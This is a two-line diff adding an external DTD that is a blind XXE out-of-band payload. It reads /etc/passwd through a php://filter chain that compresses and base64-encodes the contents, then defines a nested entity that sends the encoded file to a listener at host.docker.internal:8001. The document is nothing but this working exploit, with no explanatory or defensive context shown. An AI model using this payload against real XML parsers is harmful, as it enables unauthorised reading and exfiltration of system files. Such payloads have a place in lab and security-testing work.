@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://host.docker.internal:8001/?p=%file;'>" >
